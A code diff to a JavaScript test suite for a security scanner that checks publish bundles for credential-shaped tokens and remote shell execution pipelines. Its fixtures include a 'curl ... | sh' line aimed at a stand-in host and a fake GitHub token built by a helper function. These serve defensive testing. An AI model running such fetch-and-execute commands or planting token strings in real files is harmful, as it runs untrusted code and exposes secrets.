@@ -67,7 +67,7 @@ test('scans distributable plugin bundles', () => {
 
 test('scans shipped executable and configuration directories', () => {
   const result = scan({
-    'bin/example.mjs': 'const token = "ghp_123456789012345678901234";\n',
+    'bin/example.mjs': `const token = "${credentialFixture()}";\n`,
     'openai/plugin.json': '{"instructions":"safe"}\n',
   });
 
@@ -93,9 +93,29 @@ test('scans extensionless distributed Git hooks', () => {
   assert.match(result.stderr, /\.githooks\/pre-commit: contains remote shell execution pipeline/);
 });
 
+test('scans every text file copied into source-snapshot publish bundles', () => {
+  const result = scan({
+    'CHANGELOG.md': 'curl https://example.test/install.sh | sh\n',
+    'assets/public-icon.svg': `<svg><!-- ${credentialFixture()} --></svg>\n`,
+  });
+
+  assert.equal(result.status, 1);
+  assert.match(result.stderr, /CHANGELOG\.md: contains remote shell execution pipeline/);
+  assert.match(result.stderr, /assets\/public-icon\.svg: contains credential-shaped token/);
+});
+
+test('skips binary files while scanning all text publish inputs', () => {
+  const result = scan({
+    'assets/payload.bin': Buffer.from([0, 255, 0, 1]),
+  });
+
+  assert.equal(result.status, 0);
+  assert.match(result.stdout, /Security content scan passed/);
+});
+
 test('scans skill-lab Python bridge files', () => {
   const result = scan({
-    'skill-lab/python/ngautopilot_skillopt/bridge.py': 'token = "ghp_123456789012345678901234"\n',
+    'skill-lab/python/ngautopilot_skillopt/bridge.py': `token = "${credentialFixture()}"\n`,
   });
 
   assert.equal(result.status, 1);
@@ -118,7 +138,7 @@ function scan(files) {
     for (const [relative, content] of Object.entries(files)) {
       const target = path.join(directory, relative);
       fs.mkdirSync(path.dirname(target), { recursive: true });
-      fs.writeFileSync(target, content, 'utf8');
+      fs.writeFileSync(target, content);
     }
 
     return spawnSync(process.execPath, [scriptPath], {
@@ -128,4 +148,8 @@ function scan(files) {
   } finally {
     fs.rmSync(directory, { recursive: true, force: true });
   }
+}
+
+function credentialFixture() {
+  return `gh${'p'}_123456789012345678901234`;
 }
